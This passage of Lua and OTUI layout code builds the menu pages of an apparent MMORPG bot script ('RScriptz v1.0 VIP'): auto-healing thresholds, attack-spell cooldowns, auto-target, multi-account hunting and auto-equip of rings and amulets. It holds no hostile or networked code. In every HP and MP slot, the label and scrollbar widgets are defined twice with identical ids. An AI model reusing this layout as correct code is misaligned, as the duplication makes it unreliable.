        pcall(function() w:setText(tostring(C.get(key, def) or "")) end)
        pcall(function() w.onTextChange = function(_, t) C.set(key, t or "") end end)
    end
    local function fillCombo(combo, opts, current)
        if not combo or not opts then return end
        pcall(function() combo:clearOptions() end)
        for _, o in ipairs(opts) do pcall(function() combo:addOption(tostring(o)) end) end
        if current then pcall(function() combo:setCurrentOption(tostring(current)) end) end
    end
    local function bindCombo(w, key)
        if not w then return end
        pcall(function() w.onOptionChange = function(x)
            local o; pcall(function() o = x:getCurrentOption() end)
            if o and o.text then C.set(key, o.text) end
        end end)
    end

    -- ==================================================
    -- CONSTRUIR TODAS LAS PAGINAS (cada una en su setupUI)
    -- Todas se crean pero solo el menu esta visible al inicio.
    -- ==================================================
    local pMenu = setupUI([==[
Panel
  id: pageMenu
  height: 340

  Label
    id: brand
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: RScriptz v1.0  [VIP]
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #232323
    height: 22

  Label
    id: netLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: Net: ...
    color: #2A2A2A
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16

  BotSwitch
    id: master
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 22
    !text: tr('MASTER ON/OFF')

  Label
    id: btnHub
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 26
    text: [+]  HUB  (conexion MCs)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnCura
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  CURACIONES  (HP + MP)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnAtk
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  SPELLS DE ATAQUE
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnEx
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  EXTRAS  (spells custom)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnTgt
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  AUTO-TARGET
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnFol
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  FOLLOW  (leader)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnMch
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  MC HUNT  (multi-cuenta)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnPk
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  ANTI-PK
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnMod
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  MODULOS VBOT (nativos)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnUtil
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  UTILIDADES (XP boost, stamina)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true

  Label
    id: btnSpro
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 26
    text: [+]  SPELLS PRO (todos por vocacion)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A2A2A
    focusable: true
]==])
    local pCura = setupUI([==[
Panel
  id: pageCura
  height: 1400

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: CURACIONES
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: hpHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === HP ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 8

  Label
    id: hp1sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 1
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: hp1on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    margin-left: 2
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: hp1mode
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.bottom: prev.bottom
    margin-left: 3
    width: 46
    !text: tr('POT')

  BotItem
    id: hp1item
    anchors.top: hp1on.top
    anchors.left: hp1mode.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: hp1spell
    anchors.top: hp1on.top
    anchors.bottom: hp1on.bottom
    anchors.left: hp1item.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 3
    editable: true
    focusable: true

  Label
    id: hp1txt
    anchors.top: hp1item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: hp1pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: hp1txt
    anchors.top: hp1item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: hp1pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: hp2sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 2
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: hp2on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    margin-left: 2
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: hp2mode
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.bottom: prev.bottom
    margin-left: 3
    width: 46
    !text: tr('POT')

  BotItem
    id: hp2item
    anchors.top: hp2on.top
    anchors.left: hp2mode.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: hp2spell
    anchors.top: hp2on.top
    anchors.bottom: hp2on.bottom
    anchors.left: hp2item.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 3
    editable: true
    focusable: true

  Label
    id: hp2txt
    anchors.top: hp2item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: hp2pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: hp2txt
    anchors.top: hp2item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: hp2pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: hp3sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 3
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: hp3on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    margin-left: 2
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: hp3mode
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.bottom: prev.bottom
    margin-left: 3
    width: 46
    !text: tr('POT')

  BotItem
    id: hp3item
    anchors.top: hp3on.top
    anchors.left: hp3mode.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: hp3spell
    anchors.top: hp3on.top
    anchors.bottom: hp3on.bottom
    anchors.left: hp3item.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 3
    editable: true
    focusable: true

  Label
    id: hp3txt
    anchors.top: hp3item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: hp3pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: hp3txt
    anchors.top: hp3item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: hp3pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: mpHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === MP ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 10

  Label
    id: mp1sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 1
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: mp1on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    margin-left: 2
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: mp1mode
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.bottom: prev.bottom
    margin-left: 3
    width: 46
    !text: tr('POT')

  BotItem
    id: mp1item
    anchors.top: mp1on.top
    anchors.left: mp1mode.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: mp1spell
    anchors.top: mp1on.top
    anchors.bottom: mp1on.bottom
    anchors.left: mp1item.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 3
    editable: true
    focusable: true

  Label
    id: mp1txt
    anchors.top: mp1item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: mp1pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: mp1txt
    anchors.top: mp1item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: mp1pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: mp2sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 2
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: mp2on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    margin-left: 2
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: mp2mode
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.bottom: prev.bottom
    margin-left: 3
    width: 46
    !text: tr('POT')

  BotItem
    id: mp2item
    anchors.top: mp2on.top
    anchors.left: mp2mode.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: mp2spell
    anchors.top: mp2on.top
    anchors.bottom: mp2on.bottom
    anchors.left: mp2item.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 3
    editable: true
    focusable: true

  Label
    id: mp2txt
    anchors.top: mp2item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: mp2pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: mp2txt
    anchors.top: mp2item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: mp2pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: mp3sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 3
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: mp3on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    margin-left: 2
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: mp3mode
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.bottom: prev.bottom
    margin-left: 3
    width: 46
    !text: tr('POT')

  BotItem
    id: mp3item
    anchors.top: mp3on.top
    anchors.left: mp3mode.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: mp3spell
    anchors.top: mp3on.top
    anchors.bottom: mp3on.bottom
    anchors.left: mp3item.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 3
    editable: true
    focusable: true

  Label
    id: mp3txt
    anchors.top: mp3item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: mp3pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4

  Label
    id: mp3txt
    anchors.top: mp3item.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MP<= 50%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: mp3pct
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 5
    maximum: 100
    step: 5
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4



  Label
    id: utilHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === UTILITY (auto) ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 12

  Label
    id: hasteLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Haste:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 54

  BotSwitch
    id: hasteOn
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  ComboBox
    id: hasteSpell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4

  Label
    id: aparLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Anti-Par:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 54

  BotSwitch
    id: aparOn
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  Label
    id: aparHint
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    text: castea Haste
    text-align: center
    color: #8A8A8A
    font: verdana-11px-rounded
    margin-left: 6
    margin-right: 4

  Label
    id: utamoLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Utamo:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 54

  BotSwitch
    id: utamoOn
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotSwitch
    id: utamoMode
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    margin-left: 4
    width: 46
    !text: tr('SPELL')

  BotItem
    id: utamoRing
    anchors.top: utamoOn.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  TextEdit
    id: utamoSpell
    anchors.top: utamoOn.top
    anchors.bottom: utamoOn.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 4
    editable: true
    focusable: true


  Label
    id: ringHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: -- ANILLOS (auto-equip) --
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 8
  Label
    id: ring1lbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Ring 1:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 46

  BotSwitch
    id: ring1on
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotItem
    id: ring1inv
    anchors.top: ring1on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  BotItem
    id: ring1act
    anchors.top: ring1on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34
  Label
    id: ring2lbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Ring 2:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 46

  BotSwitch
    id: ring2on
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotItem
    id: ring2inv
    anchors.top: ring2on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  BotItem
    id: ring2act
    anchors.top: ring2on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34
  Label
    id: ring3lbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Ring 3:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 46

  BotSwitch
    id: ring3on
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotItem
    id: ring3inv
    anchors.top: ring3on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  BotItem
    id: ring3act
    anchors.top: ring3on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  Label
    id: neckHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: -- AMULETOS (auto-equip) --
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 10
  Label
    id: neck1lbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Neck 1:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 46

  BotSwitch
    id: neck1on
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotItem
    id: neck1inv
    anchors.top: neck1on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  BotItem
    id: neck1act
    anchors.top: neck1on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34
  Label
    id: neck2lbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Neck 2:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 46

  BotSwitch
    id: neck2on
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotItem
    id: neck2inv
    anchors.top: neck2on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  BotItem
    id: neck2act
    anchors.top: neck2on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34
  Label
    id: neck3lbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Neck 3:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 46

  BotSwitch
    id: neck3on
    anchors.top: prev.top
    anchors.left: prev.right
    margin-left: 4
    height: 20
    width: 40
    !text: tr('ON')

  BotItem
    id: neck3inv
    anchors.top: neck3on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34

  BotItem
    id: neck3act
    anchors.top: neck3on.top
    anchors.left: prev.right
    margin-left: 6
    size: 34 34
]==]); pcall(function() pCura:hide() end)
    local pAtk  = setupUI([==[
Panel
  id: pageAtk
  height: 400

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: SPELLS DE ATAQUE
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: atk1sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 1
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: atk1on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    height: 20
    width: 60
    !text: tr('ON')

  ComboBox
    id: atk1spell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4

  Label
    id: atk1txt
    anchors.top: atk1on.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 2000 ms
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: atk1cd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 500
    maximum: 8000
    step: 100
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: atk2sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 2
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: atk2on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    height: 20
    width: 60
    !text: tr('ON')

  ComboBox
    id: atk2spell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4

  Label
    id: atk2txt
    anchors.top: atk2on.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 2000 ms
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: atk2cd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 500
    maximum: 8000
    step: 100
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: atk3sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 3
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: atk3on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    height: 20
    width: 60
    !text: tr('ON')

  ComboBox
    id: atk3spell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4

  Label
    id: atk3txt
    anchors.top: atk3on.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 2000 ms
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: atk3cd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 500
    maximum: 8000
    step: 100
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
]==]);  pcall(function() pAtk:hide() end)
    local pEx   = setupUI([==[
Panel
  id: pageEx
  height: 400

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: EXTRAS (spells custom)
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: ex1sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 1
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: ex1on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    height: 20
    width: 60
    !text: tr('ON')

  TextEdit
    id: ex1spell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4
    editable: true
    focusable: true

  Label
    id: ex1txt
    anchors.top: ex1on.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 5 seg
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: ex1cd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 1
    maximum: 120
    step: 1
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: ex2sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 2
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: ex2on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    height: 20
    width: 60
    !text: tr('ON')

  TextEdit
    id: ex2spell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4
    editable: true
    focusable: true

  Label
    id: ex2txt
    anchors.top: ex2on.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 5 seg
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: ex2cd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 1
    maximum: 120
    step: 1
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
  Label
    id: ex3sep
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: left
    text:   Slot 3
    color: #C8C8C8
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  BotSwitch
    id: ex3on
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 3
    height: 20
    width: 60
    !text: tr('ON')

  TextEdit
    id: ex3spell
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 6
    margin-right: 4
    editable: true
    focusable: true

  Label
    id: ex3txt
    anchors.top: ex3on.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 5 seg
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: ex3cd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 1
    maximum: 120
    step: 1
    height: 14
    margin-top: 2
    margin-left: 4
    margin-right: 4
]==]);   pcall(function() pEx:hide() end)
    local pTgt  = setupUI([==[
Panel
  id: pageTgt
  height: 200

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
